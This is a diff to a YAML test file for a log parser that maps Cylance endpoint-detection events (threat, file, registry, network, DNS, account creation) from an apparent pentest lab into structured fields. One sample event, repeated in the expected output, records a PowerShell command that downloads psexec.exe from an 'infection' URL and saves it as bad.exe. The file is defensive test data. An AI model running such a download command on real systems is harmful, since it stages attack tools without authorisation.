@@ -267,77 +267,404 @@ tests:
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: Threat, Event Name: threat_changed, Device Name: Unknown (test1), IP Address: (), File Name: , Path: , Drive Type: Internal Hard Drive, SHA256: D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C4, MD5: E719222BD4624F1C0A92117FE33E2612, Status: Quarantined, Cylance Score: 96, Found Date: 11/18/2025 8:40:23 AM, File Type: Executable, Is Running: False, Auto Run: False, Detected By: FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware: True, Is Unique To Cylance: False, Threat Classification: Malware - Trojan, Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8c, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
   result:
-    custom: {}
+    custom:
+      Status: "Quarantined"
+      additional_details: ""
+      auto_run: "False"
+      cylance_score: 96
+      detected_by: "FileWatcher"
+      device_id: "0929f443-2a56-46b3-bcfe-fc598da81d8c"
+      device_name: "Unknown (test1)"
+      drive_type: "Internal Hard Drive"
+      event_type: "Threat"
+      evt:
+        name: "threat_changed"
+      file_state: "Unsafe"
+      file_type: "Executable"
+      found_date: "11/18/2025 8:40:23 AM"
+      ip_addresses: []
+      is_malware: "True"
+      is_running: "False"
+      is_unique_to_cylance: "False"
+      md5: "E719222BD4624F1C0A92117FE33E2612"
+      policy_name: "Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+      service: "desktop-events"
+      sha256: "D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C4"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      threat_classification: "Malware - Trojan"
+      zone_names: "(Windows Zone (Default))"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: Threat, Event Name: threat_changed, Device Name: Unknown (test1), IP Address: (), File Name: , Path: , Drive Type: Internal Hard Drive, SHA256: D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C4, MD5: E719222BD4624F1C0A92117FE33E2612, Status: Quarantined, Cylance Score: 96, Found Date: 11/18/2025 8:40:23 AM, File Type: Executable, Is Running: False, Auto Run: False, Detected By: FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware: True, Is Unique To Cylance: False, Threat Classification: Malware - Trojan, Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8c, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: ThreatClassification, Event Name: ThreatUpdated, Threat Class: Malware, Threat Subclass: Trojan, Threat Family: diskwriter, SHA256: 3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258148, MD5: D50E739C71C9513B306F3393762CFC84"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      event_type: "ThreatClassification"
+      evt:
+        name: "ThreatUpdated"
+      md5: "D50E739C71C9513B306F3393762CFC84"
+      service: "desktop-events"
+      sha256: "3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258148"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      threat_class: "Malware"
+      threat_family: "diskwriter"
+      threat_subclass: "Trojan"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: ThreatClassification, Event Name: ThreatUpdated, Threat Class: Malware, Threat Subclass: Trojan, Threat Family: diskwriter, SHA256: 3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258148, MD5: D50E739C71C9513B306F3393762CFC84"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeProcessEvent, Event Name: OpticsCaeProcessEvent, Device Name: SECURITYSERVER2, Zone Names: (Jeff Test), Event Id: dbe47fda-f37b-42cc-a308-9675feb7e36a, Severity: High, Description: Jeffs Take 2 Powershell Download, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: 935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2, Event Timestamp: 2022-06-23T12:54:15.811Z, Event Received Timestamp: 2022-06-23T12:54:41Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (39BFDA7FEF71490584AAB4F163142350), Detection Rule Id: 3f110342-88f8-11ec-a8a3-0242ac120002, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target Process Name: powershell.exe, Target Process Owner: PENTEST//Administrator, Target Process ImageFileSha256: BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436, Device Id: 3514593e-7405-4319-8ca5-8ec876bf0195, Target Process Command Line: powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\", Target Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "Jeffs Take 2 Powershell Download"
+      detection_rule_id: "3f110342-88f8-11ec-a8a3-0242ac120002"
+      device_id: "3514593e-7405-4319-8ca5-8ec876bf0195"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER2"
+      event_id: "dbe47fda-f37b-42cc-a308-9675feb7e36a"
+      event_received_timestamp: "2022-06-23T12:54:41Z"
+      event_timestamp: "2022-06-23T12:54:15.811Z"
+      event_type: "OpticsCaeProcessEvent"
+      evt:
+        name: "OpticsCaeProcessEvent"
+      instigating_process_command_line: "\"C:\\Windows\\system32\\cmd.exe\" "
+      instigating_process_file_path: "c:\\windows\\system32\\cmd.exe"
+      instigating_process_imagefilesha256: "935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2"
+      instigating_process_name: "cmd.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "High"
+      status: "critical"
+      target_process_command_line: "powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\""
+      target_process_file_path: "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+      target_process_imagefilesha256: "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+      target_process_name: "powershell.exe"
+      target_process_owner: "PENTEST//Administrator"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(39BFDA7FEF71490584AAB4F163142350)"
+      zone_names: "(Jeff Test)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeProcessEvent, Event Name: OpticsCaeProcessEvent, Device Name: SECURITYSERVER2, Zone Names: (Jeff Test), Event Id: dbe47fda-f37b-42cc-a308-9675feb7e36a, Severity: High, Description: Jeffs Take 2 Powershell Download, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: 935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2, Event Timestamp: 2022-06-23T12:54:15.811Z, Event Received Timestamp: 2022-06-23T12:54:41Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (39BFDA7FEF71490584AAB4F163142350), Detection Rule Id: 3f110342-88f8-11ec-a8a3-0242ac120002, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target Process Name: powershell.exe, Target Process Owner: PENTEST//Administrator, Target Process ImageFileSha256: BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436, Device Id: 3514593e-7405-4319-8ca5-8ec876bf0195, Target Process Command Line: powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\", Target Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+    service: "detection-events"
+    status: "critical"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeFileEvent, Event Name: OpticsCaeFileEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: f4739af7-9c8b-4dc0-aeb7-2d4533445d49, Severity: Medium, Description: SYSLOG detections - Looking for a created file cylancetest.txt, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527, Event Timestamp: 2022-06-28T18:09:32.693Z, Event Received Timestamp: 2022-06-28T18:09:36Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74bd0e7e-281a-4d7b-9f84-d0f51346782c, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt, Target File Owner: BUILTIN//Administrators, Target File Sha256: , Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "SYSLOG detections - Looking for a created file cylancetest.txt"
+      detection_rule_id: "74bd0e7e-281a-4d7b-9f84-d0f51346782c"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "f4739af7-9c8b-4dc0-aeb7-2d4533445d49"
+      event_received_timestamp: "2022-06-28T18:09:36Z"
+      event_timestamp: "2022-06-28T18:09:32.693Z"
+      event_type: "OpticsCaeFileEvent"
+      evt:
+        name: "OpticsCaeFileEvent"
+      instigating_process_command_line: "\"C:\\Windows\\system32\\cmd.exe\" "
+      instigating_process_file_path: "c:\\windows\\system32\\cmd.exe"
+      instigating_process_imagefilesha256: "BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527"
+      instigating_process_name: "cmd.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      target_file_owner: "BUILTIN//Administrators"
+      target_file_path: "c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeFileEvent, Event Name: OpticsCaeFileEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: f4739af7-9c8b-4dc0-aeb7-2d4533445d49, Severity: Medium, Description: SYSLOG detections - Looking for a created file cylancetest.txt, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527, Event Timestamp: 2022-06-28T18:09:32.693Z, Event Received Timestamp: 2022-06-28T18:09:36Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74bd0e7e-281a-4d7b-9f84-d0f51346782c, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt, Target File Owner: BUILTIN//Administrators, Target File Sha256: , Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeRegistryEvent, Event Name: OpticsCaeRegistryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 6d33d636-dcdc-48c2-911a-ead99ac17f88, Severity: Medium, Description: SYSLOG detections - RegistryKey \\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Instigating Process Name: ICreatePersistencePoints.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: F83926AB855E860C9B1A6D72EB6024D9E1D569A59E4901A62E8543B1C978D5E5, Event Timestamp: 2022-06-28T18:08:49.103Z, Event Received Timestamp: 2022-06-28T18:08:54Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74354415-7d28-4f31-830d-72a14c0c3d8b, Instigating Process Command Line: ICreatePersistencePoints.exe --trigger 0, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatepersistencepoints.exe, Target Registry KeyPath: HKLM\\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Target Registry ValueName: , Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "SYSLOG detections - RegistryKey \\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext"
+      detection_rule_id: "74354415-7d28-4f31-830d-72a14c0c3d8b"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "6d33d636-dcdc-48c2-911a-ead99ac17f88"
+      event_received_timestamp: "2022-06-28T18:08:54Z"
+      event_timestamp: "2022-06-28T18:08:49.103Z"
+      event_type: "OpticsCaeRegistryEvent"
+      evt:
+        name: "OpticsCaeRegistryEvent"
+      instigating_process_command_line: "ICreatePersistencePoints.exe --trigger 0"
+      instigating_process_file_path: "c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatepersistencepoints.exe"
+      instigating_process_imagefilesha256: "F83926AB855E860C9B1A6D72EB6024D9E1D569A59E4901A62E8543B1C978D5E5"
+      instigating_process_name: "ICreatePersistencePoints.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      target_registry_keypath: "HKLM\\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeRegistryEvent, Event Name: OpticsCaeRegistryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 6d33d636-dcdc-48c2-911a-ead99ac17f88, Severity: Medium, Description: SYSLOG detections - RegistryKey \\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Instigating Process Name: ICreatePersistencePoints.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: F83926AB855E860C9B1A6D72EB6024D9E1D569A59E4901A62E8543B1C978D5E5, Event Timestamp: 2022-06-28T18:08:49.103Z, Event Received Timestamp: 2022-06-28T18:08:54Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74354415-7d28-4f31-830d-72a14c0c3d8b, Instigating Process Command Line: ICreatePersistencePoints.exe --trigger 0, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatepersistencepoints.exe, Target Registry KeyPath: HKLM\\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Target Registry ValueName: , Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeNetworkEvent, Event Name: OpticsCaeNetworkEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 23a04c4c-1a97-4a58-b4bc-fadadb729e32, Severity: Medium, Description: SYSLOG detections - Looking for NetworkConnection 8.8.8.8, Instigating Process Name: ICreateNetworkConnections.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: F816E73FFAD0CA8684B6E44292276DD9B9CB8890ABAA732A7AEB283B46D32003, Event Timestamp: 2022-06-28T18:09:56.392Z, Event Received Timestamp: 2022-06-28T18:10:00Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: fdac76c9-5c6b-4b6f-8062-e074457afe3e, Instigating Process Command Line: ICreateNetworkConnections.exe --sequential 8.8.8.8, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatenetworkconnections.exe, Destination IP: 8.8.8.81, Destination Port: 29281, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954, Source IP: 192.168.254.102, Source Port: 52912"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "SYSLOG detections - Looking for NetworkConnection 8.8.8.8"
+      detection_rule_id: "fdac76c9-5c6b-4b6f-8062-e074457afe3e"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "23a04c4c-1a97-4a58-b4bc-fadadb729e32"
+      event_received_timestamp: "2022-06-28T18:10:00Z"
+      event_timestamp: "2022-06-28T18:09:56.392Z"
+      event_type: "OpticsCaeNetworkEvent"
+      evt:
+        name: "OpticsCaeNetworkEvent"
+      instigating_process_command_line: "ICreateNetworkConnections.exe --sequential 8.8.8.8"
+      instigating_process_file_path: "c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatenetworkconnections.exe"
+      instigating_process_imagefilesha256: "F816E73FFAD0CA8684B6E44292276DD9B9CB8890ABAA732A7AEB283B46D32003"
+      instigating_process_name: "ICreateNetworkConnections.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      network:
+        client:
+          geoip: {}
+          ip: "192.168.254.102"
+          port: "52912"
+        destination:
+          geoip: {}
+          ip: "8.8.8.81"
+          port: "29281"
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeNetworkEvent, Event Name: OpticsCaeNetworkEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 23a04c4c-1a97-4a58-b4bc-fadadb729e32, Severity: Medium, Description: SYSLOG detections - Looking for NetworkConnection 8.8.8.8, Instigating Process Name: ICreateNetworkConnections.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: F816E73FFAD0CA8684B6E44292276DD9B9CB8890ABAA732A7AEB283B46D32003, Event Timestamp: 2022-06-28T18:09:56.392Z, Event Received Timestamp: 2022-06-28T18:10:00Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: fdac76c9-5c6b-4b6f-8062-e074457afe3e, Instigating Process Command Line: ICreateNetworkConnections.exe --sequential 8.8.8.8, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatenetworkconnections.exe, Destination IP: 8.8.8.81, Destination Port: 29281, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954, Source IP: 192.168.254.102, Source Port: 52912"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeDnsEvent, Event Name: OpticsCaeDnsEvent, Device Name: SECURITYSERVER, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 6458f3ac-e527-4922-83ac-654518c3137e, Severity: Medium, Description: Win_Suspicious_DNSLength_MitreT1071, Instigating Process Name: lsass.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: 91EAB6178A9BB2B268E7438E54B128F939C0BDF5BD8AC8B15EFCAF0572AADC3F, Event Timestamp: 2022-06-28T17:34:12.772Z, Event Received Timestamp: 2022-06-28T17:34:33Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 0da4f7c3-af0d-46be-8f6b-1884a1c67331, Instigating Process Command Line: C:\\Windows\\system32\\lsass.exe, Instigating Process File Path: c:\\windows\\system32\\lsass.exe, Target Domain Name: 7f2a98df-486e-4cec-8d6e-c227073955e6._msdcs.Pentest.Local., Resolved Address: securityserver.Pentest.Local, Resolved Address Count: 1, Device Id: 41666e82-50e6-4777-88b6-5f2b567027b9"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "Win_Suspicious_DNSLength_MitreT1071"
+      detection_rule_id: "0da4f7c3-af0d-46be-8f6b-1884a1c67331"
+      device_id: "41666e82-50e6-4777-88b6-5f2b567027b9"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER"
+      dns:
+        question:
+          name: "7f2a98df-486e-4cec-8d6e-c227073955e6._msdcs.Pentest.Local."
+      event_id: "6458f3ac-e527-4922-83ac-654518c3137e"
+      event_received_timestamp: "2022-06-28T17:34:33Z"
+      event_timestamp: "2022-06-28T17:34:12.772Z"
+      event_type: "OpticsCaeDnsEvent"
+      evt:
+        name: "OpticsCaeDnsEvent"
+      instigating_process_command_line: "C:\\Windows\\system32\\lsass.exe"
+      instigating_process_file_path: "c:\\windows\\system32\\lsass.exe"
+      instigating_process_imagefilesha256: "91EAB6178A9BB2B268E7438E54B128F939C0BDF5BD8AC8B15EFCAF0572AADC3F"
+      instigating_process_name: "lsass.exe"
+      instigating_process_owner: "NT AUTHORITY//SYSTEM"
+      resolved_address: "securityserver.Pentest.Local"
+      resolved_address_count: 1
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeDnsEvent, Event Name: OpticsCaeDnsEvent, Device Name: SECURITYSERVER, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 6458f3ac-e527-4922-83ac-654518c3137e, Severity: Medium, Description: Win_Suspicious_DNSLength_MitreT1071, Instigating Process Name: lsass.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: 91EAB6178A9BB2B268E7438E54B128F939C0BDF5BD8AC8B15EFCAF0572AADC3F, Event Timestamp: 2022-06-28T17:34:12.772Z, Event Received Timestamp: 2022-06-28T17:34:33Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 0da4f7c3-af0d-46be-8f6b-1884a1c67331, Instigating Process Command Line: C:\\Windows\\system32\\lsass.exe, Instigating Process File Path: c:\\windows\\system32\\lsass.exe, Target Domain Name: 7f2a98df-486e-4cec-8d6e-c227073955e6._msdcs.Pentest.Local., Resolved Address: securityserver.Pentest.Local, Resolved Address Count: 1, Device Id: 41666e82-50e6-4777-88b6-5f2b567027b9"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeLogEvent, Event Name: OpticsCaeLogEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: ba8810a9-afac-4579-82a2-638f0f584d60, Severity: High, Description: Win_CreateAccount_MitreT1136, Instigating Process Name: lsass.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: BBC83E4759D4B82BAD31E371AD679AA414C72273BF97CEE5AED8337ED8A4D79F, Event Timestamp: 2022-06-28T18:17:05.001Z, Event Received Timestamp: 2022-06-28T18:17:10Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 266e750f-a838-4974-9afc-20cb863031cc, Instigating Process Command Line: C:\\Windows\\system32\\lsass.exe, Instigating Process File Path: c:\\windows\\system32\\lsass.exe, Windows Event Id: 4720, Security Provider: SecurityAuditProvider, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "Win_CreateAccount_MitreT1136"
+      detection_rule_id: "266e750f-a838-4974-9afc-20cb863031cc"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "ba8810a9-afac-4579-82a2-638f0f584d60"
+      event_received_timestamp: "2022-06-28T18:17:10Z"
+      event_timestamp: "2022-06-28T18:17:05.001Z"
+      event_type: "OpticsCaeLogEvent"
+      evt:
+        name: "OpticsCaeLogEvent"
+      instigating_process_command_line: "C:\\Windows\\system32\\lsass.exe"
+      instigating_process_file_path: "c:\\windows\\system32\\lsass.exe"
+      instigating_process_imagefilesha256: "BBC83E4759D4B82BAD31E371AD679AA414C72273BF97CEE5AED8337ED8A4D79F"
+      instigating_process_name: "lsass.exe"
+      instigating_process_owner: "NT AUTHORITY//SYSTEM"
+      security_provider: "SecurityAuditProvider"
+      service: "detection-events"
+      severity: "High"
+      status: "critical"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f3"
+      tenant_name: "Mimecast"
+      windows_event_id: "4720"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f3, Tenant Name: Mimecast, Event Type: OpticsCaeLogEvent, Event Name: OpticsCaeLogEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: ba8810a9-afac-4579-82a2-638f0f584d60, Severity: High, Description: Win_CreateAccount_MitreT1136, Instigating Process Name: lsass.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: BBC83E4759D4B82BAD31E371AD679AA414C72273BF97CEE5AED8337ED8A4D79F, Event Timestamp: 2022-06-28T18:17:05.001Z, Event Received Timestamp: 2022-06-28T18:17:10Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 266e750f-a838-4974-9afc-20cb863031cc, Instigating Process Command Line: C:\\Windows\\system32\\lsass.exe, Instigating Process File Path: c:\\windows\\system32\\lsass.exe, Windows Event Id: 4720, Security Provider: SecurityAuditProvider, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+    service: "detection-events"
+    status: "critical"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
